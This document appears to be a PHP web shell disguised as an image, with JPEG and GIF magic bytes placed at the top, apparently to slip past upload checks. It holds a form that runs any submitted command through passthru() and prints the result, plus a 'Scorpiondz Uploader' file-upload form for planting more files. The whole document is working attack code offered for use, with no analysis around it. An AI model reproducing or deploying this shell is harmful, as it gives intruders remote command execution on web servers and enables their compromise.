ÿØÿà
<form action="" method="post">
Command: <input type="text" name="cmd" /><input type="submit" value="Exec" />
</form>
Output:<br />
<pre><?php passthru($_POST['cmd'], $result); ?></pre>

GIF89;aGIF89;aGIF89;a
<?php ?>
<!DOCTYPE html>
<html>
<head>
<title>Welcome</title>
</head>
<body><h1>Scorpiondz Uploader</h1>
<form enctype='multipart/form-data' action='' method='POST'>
<p>Scorpiondz Uploaded</p>
<input type='file' name='uploaded_file'></input><br />
<input type='submit' value='Upload'></input>
</form>
</body>
</html>
